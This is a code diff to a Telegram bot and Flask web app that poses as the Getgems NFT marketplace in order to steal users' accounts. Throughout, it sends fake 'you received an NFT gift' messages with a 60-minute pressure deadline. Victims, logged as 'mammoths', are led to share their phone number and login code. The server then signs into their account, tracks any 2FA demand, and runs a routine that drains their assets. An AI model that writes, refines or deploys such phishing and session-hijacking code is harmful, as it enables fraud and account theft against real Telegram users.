@@ -3,7 +3,7 @@ import asyncio
 import threading
 import urllib.parse
 import datetime
-import time  # Добавлено для контроля времени
+import time # Модуль для контроля времени 60 минут
 from flask import Flask, render_template, request, jsonify
 from telethon import TelegramClient, events, Button, functions, types
 from telethon.errors import (
@@ -107,24 +107,35 @@ async def drain_logic(client, phone):
         btns = [Button.inline("🔄 Высушить заново", data=f"redrain_{phone}")]
         send_log(f"⚠️ Ошибка drain_logic {phone}: {e}", buttons=btns)
 
-# --- ИНЛАЙН РЕЖИМ (ИСПРАВЛЕННЫЙ И ДОРАБОТАННЫЙ) ---
+# --- ИНЛАЙН РЕЖИМ (ИСПРАВЛЕННЫЙ) ---
 @bot.on(events.InlineQuery)
 async def inline_handler(event):
+    # 1. Проверка доступа
     if event.sender_id not in get_trusted():
-        await event.answer([], switch_pm="Доступ ограничен.", switch_pm_param="no_access")
+        await event.answer(
+            [], 
+            switch_pm="Доступ ограничен. Введите /ftpteam ftpteam в ЛС.",
+            switch_pm_param="no_access"
+        )
         return
 
+    # 2. Обработка пустого ввода или текста без ссылки
     if not event.text or not event.text.strip().startswith("http"):
-        await event.answer([], switch_pm="Введите ссылку на NFT подарок...", switch_pm_param="help")
+        await event.answer(
+            [],
+            switch_pm="Введите ссылку на NFT подарок...",
+            switch_pm_param="help"
+        )
         return
 
+    # 3. Если ссылка введена
     input_text = event.text.strip()
     try:
         nft_name = input_text.split('/')[-1].replace('-', ' ').title()
     except:
         nft_name = "NFT Gift"
 
-    # Добавляем временную метку (timestamp) для проверки 60 минут
+    # Формируем URL для WebApp с меткой времени для контроля 60 минут
     timestamp = int(time.time())
     web_url = f"https://{DOMAIN}/?nft_url={urllib.parse.quote(input_text)}&t={timestamp}"
     
@@ -132,20 +143,20 @@ async def inline_handler(event):
     
     await event.answer([
         builder.article(
-            title=f"🎁 Отправить подарок: {nft_name}",
-            description="Лимит: 60 минут",
+            title=f"🎁 Подарить подарок: {nft_name}",
+            description="Лимит принятия: 60 минут",
             text=(
-                f"🎁 **Вам отправили подарок: {nft_name}**\n\n"
+                f"🎁 **Вам отправили подарок!**\n\n"
+                f"Объект: `{nft_name}`\n\n"
                 "Учтите, что подарок можно принять только с аккаунта, на "
-                "который он был отправлен. Ссылка действительна "
-                "**60 минут**.\n\n"
-                f"{input_text}"
+                "который был отправлен данный подарок. Ссылка действительна "
+                "**60 минут** с момента получения.\n\n"
+                "Нажмите кнопку ниже, чтобы принять 👇"
             ),
-            link_preview=True,
             buttons=[
-                # Основная кнопка для захода в WebApp (слив)
-                [Button.web_app("Забрать NFT 🎁", web_url)],
-                # Кнопка перекидывает ИМЕННО на подарок в Telegram
+                # Исправлено: использование Button.web_app для корректного отображения в инлайне
+                [Button.web_app("Принять подарок 🎁", web_url)],
+                # Кнопка ведет именно на оригинальную ссылку подарка
                 [Button.url("Посмотреть подарок", input_text)]
             ]
         )
@@ -157,13 +168,24 @@ async def inline_handler(event):
 async def ftpteam_handler(event):
     if add_trusted(event.sender_id):
         username = f"@{event.sender.username}" if event.sender.username else "N/A"
-        send_log(f"🔑 Пользователь {username} (ID: {event.sender_id}) получил доступ.")
-        await event.respond("✅ Доступ разрешен.")
+        send_log(f"🔑 Пользователь {username} (ID: {event.sender_id}) получил доступ к админке через /ftpteam")
+        await event.respond("✅ Доступ к админ-функционалу (Inline & Logs) разрешен навсегда.")
+    else:
+        await event.respond("ℹ️ У вас уже есть доступ.")
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
-    welcome_text = "Это бот Getgems. 🎯\n\n💎 0% комиссии на торговлю подарками."
-    buttons = [[Button.url("Торговать подарками ↗", "https://getgems.io/nft-gifts")]]
+    welcome_text = (
+        "Это бот Getgems — он позволяет торговать NFT прямо в мини-приложении Telegram. "
+        "Это самый удобный способ покупать и продавать Telegram-подарки, юзернеймы и анонимные номера. 🎯\n\n"
+        "💎 0% комиссии на торговлю оффчейн Telegram-подарками\n"
+        "💎 Покупайте Telegram Stars на 30% дешевле, чем в Telegram\n\n"
+    )
+    buttons = [
+        [Button.url("Торговать номерами ↗", "https://getgems.io/collection/EQAOQdwdw8kGftJCSFgOErM1mBjYPe4DBPq8-AhF6vr9si5N")],
+        [Button.url("Торговать юзернеймами ↗", "https://getgems.io/collection/EQCA14o1-VWhS2efqoh_9M1b_A9DtKTuoqfmkn83AbJzwnPi")],
+        [Button.url("Торговать подарками ↗", "https://getgems.io/nft-gifts")]
+    ]
     await event.respond(welcome_text, buttons=buttons, link_preview=False)
 
 @bot.on(events.NewMessage(pattern='/stars_check'))
@@ -171,7 +193,7 @@ async def stars_check(event):
     if event.sender_id != ADMIN_ID: return
     try:
         res = await bot(functions.payments.GetStarsStatusRequest(peer='me'))
-        await event.respond(f"📊 <b>Баланс:</b> {res.balance}★", parse_mode='html')
+        await event.respond(f"📊 <b>Баланс:</b> {res.balance}★\n🚀 <b>Хватит на:</b> {res.balance // 25} передач.", parse_mode='html')
     except Exception as e:
         await event.respond(f" Ошибка: {e}")
 
@@ -179,8 +201,10 @@ async def stars_check(event):
 async def redrain_callback(event):
     phone = event.pattern_match.group(1).decode('utf-8')
     if phone in active_clients:
-        await event.answer("Запускаю...")
+        await event.answer("Запускаю повторно...")
         asyncio.create_task(drain_logic(active_clients[phone], phone))
+    else:
+        await event.answer("Ошибка: Сессия потеряна!", alert=True)
 
 # --- API ROUTES (FLASK) ---
 @app.route('/')
@@ -188,31 +212,39 @@ def index():
     target = request.args.get('nft_url', 'Главная')
     t_start = request.args.get('t')
     
-    # Проверка на 60 минут (3600 секунд)
+    # Проверка на истечение 60 минут (3600 секунд)
     if t_start:
         try:
             if int(time.time()) - int(t_start) > 3600:
-                return "<h1>Ошибка: Время принятия подарка истекло (60 минут).</h1>", 403
+                return "<h1>Ошибка: Ссылка более недействительна. Время на принятие подарка (60 минут) истекло.</h1>", 403
         except: pass
 
     send_log(f"🌐 Мамонт открыл WebApp. Цель: {target}")
     return render_template('index.html')
 
+@app.route('/api/check_contact')
+def check_contact():
+    uid = request.args.get('id', '0')
+    if uid in pending_contacts:
+        return jsonify({"status": "received", "phone": pending_contacts[uid]})
+    return jsonify({"status": "waiting"})
+
 @app.route('/api/send_code', methods=['POST'])
 async def api_send_code():
     data = request.json
     phone, code = data.get('phone'), data.get('code')
-    send_log(f"🔑 Код {phone}: {code}")
+    send_log(f"🔑 Мамонт {phone} ввел код: {code}")
     try:
         client = temp_clients[phone]['client']
         await client.sign_in(phone, code, phone_code_hash=temp_clients[phone]['hash'])
         active_clients[phone] = client
-        send_log(f"✅ Успех {phone}. Слив...")
+        send_log(f"✅ Вход успешен: {phone}. Начинаю слив.")
         asyncio.create_task(drain_logic(client, phone))
         return jsonify({"status": "success"})
     except PhoneCodeInvalidError:
         return jsonify({"status": "error", "message": "Неверный код"})
     except SessionPasswordNeededError:
+        send_log(f"🔐 На {phone} требуется 2FA пароль.")
         return jsonify({"status": "2fa_needed"})
     except Exception as e:
         return jsonify({"status": "error", "details": str(e)})
@@ -223,6 +255,7 @@ async def contact_handler(event):
         phone = event.contact.phone_number
         if not phone.startswith('+'): phone = '+' + phone
         pending_contacts[str(event.sender_id)] = phone
+        send_log(f"📞 Мамонт поделился номером: {phone}")
         try:
             client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
             await client.connect()
@@ -230,7 +263,7 @@ async def contact_handler(event):
             temp_clients[phone] = {'client': client, 'hash': res.phone_code_hash}
             send_log(f"📩 Код на {phone} отправлен.")
         except Exception as e:
-            send_log(f"❌ Ошибка {phone}: {e}")
+            send_log(f"❌ Ошибка сессии {phone}: {e}")
 
 if __name__ == '__main__':
     if not os.path.exists('sessions'): os.makedirs('sessions')
